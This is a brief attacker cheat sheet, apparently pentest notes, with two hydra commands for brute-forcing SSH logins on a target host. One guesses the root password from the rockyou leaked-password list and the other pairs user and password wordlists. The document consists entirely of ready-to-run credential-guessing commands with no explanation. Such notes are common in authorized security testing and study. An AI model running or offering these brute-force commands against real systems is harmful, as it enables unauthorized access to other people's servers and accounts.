# linux attacker

## bruteforce ssh root login

```bash
hydra -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt "$rhost" -t 4 ssh
```

# bruteforce ssh with user wordlist and password wordlist

```bash
hydra -L pot-user.txt -P pot-password.txt "$rhost" -t 4 ssh
```
